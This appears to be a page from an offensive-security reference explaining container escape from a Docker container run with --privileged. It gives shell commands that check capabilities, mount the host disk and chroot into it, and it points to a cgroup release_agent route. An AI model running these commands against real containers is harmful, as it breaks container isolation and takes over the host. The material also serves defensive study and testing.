---
title: "Privileged flag: full host access from a --privileged container"
description: "Escaping a container run with the privileged flag, which grants every Linux capability, access to all host devices, and an unconfined seccomp and AppArmor profile, collapsing isolation to direct host takeover through a device mount or the release_agent escape."
keywords:
  - privileged container
  - docker privileged
  - container escape
  - host device access
  - release_agent
---

# Privileged flag

`--privileged` is the single most common escape. It gives the container all capabilities, access to every host device under `/dev`, and an unconfined seccomp and AppArmor profile. With all three, the container is root on the host in every way that matters; the only step left is to pick a route out.

```bash
# Confirm: full device list visible and a fat capability set
ls /dev | head; capsh --print | grep -i 'cap_sys_admin'

# Mount the host disk and chroot in
fdisk -l 2>/dev/null                     # find the host root device, e.g. /dev/sda1
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh
```

If mounting the disk is awkward, the cgroup `release_agent` route works from any privileged container:

```bash
# See cgroups-release-agent for the full technique
grep -q cgroup /proc/filesystems && echo "release_agent escape available"
```

## Exploitation notes

- Privileged is a superset: anything under [Capability abuse](capability-abuse/index.md), [Device access](device-access/index.md), and [cgroups release_agent](cgroups-release-agent.md) is available at once.
- Mounting the host block device is usually the quickest interactive route; `release_agent` is the most reliable one-liner.
- In Kubernetes this is `securityContext.privileged: true`, the privileged-pod delivery view in the Kubernetes area.

## References

- [Docker runtime privilege and capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
